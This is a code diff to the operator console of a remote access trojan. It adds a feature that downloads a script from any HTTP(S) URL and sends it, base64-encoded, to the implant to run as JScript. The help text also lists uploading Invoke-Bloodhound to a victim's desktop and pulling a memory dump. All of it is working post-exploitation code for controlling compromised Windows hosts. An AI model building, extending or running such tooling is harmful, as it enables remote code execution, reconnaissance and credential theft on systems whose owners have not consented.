@@ -20,6 +20,7 @@ from pathlib import Path
 import threading
 import argparse
 import readline
+import requests
 import logging
 import random
 import string
@@ -837,7 +838,7 @@ def get_help():
     pretty_print("example: upload scripts/Invoke-Bloodhound.ps1 C:\\users\\localadmin\\desktop\\ibh.ps1")
     pretty_print("download -- downloads the specified file from the rat host")
     pretty_print("example: download C:\\users\\localadmin\\desktop\\minidump_660.dmp")
-    pretty_print("eval <local_jscript_file> -- sends the jscript file to the rat (JS and HTA only) to be evaulated in line. Useful for Gadget2JS payloads")
+    pretty_print("eval <local_jscript_file|http_url> -- sends the jscript file to the rat (JS and HTA only) to be evaulated in line. Useful for Gadget2JS payloads")
     pretty_print("example: eval test.js")
     pretty_print("-------------------------------------------------------------------------")
     pretty_print("")
@@ -1078,7 +1079,12 @@ if __name__ == "__main__":
                                     pretty_print("[!] Eval is not supported for PS1 or C# rats")
                                     continue
                                 else:
-                                    inp = "ev " + encode_file(filepath)
+                                    if(str.startswith(filepath, "http://") or str.startswith(filepath, "https://")): # http URL eval
+                                        r = requests.get(filepath)
+                                        url_data = r.text
+                                        inp = "ev " + base64.b64encode(url_data.encode('utf-8')).decode('utf-8')
+                                    else: # file path eval
+                                        inp = "ev " + encode_file(filepath)
                             except:
                                 pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                                 continue
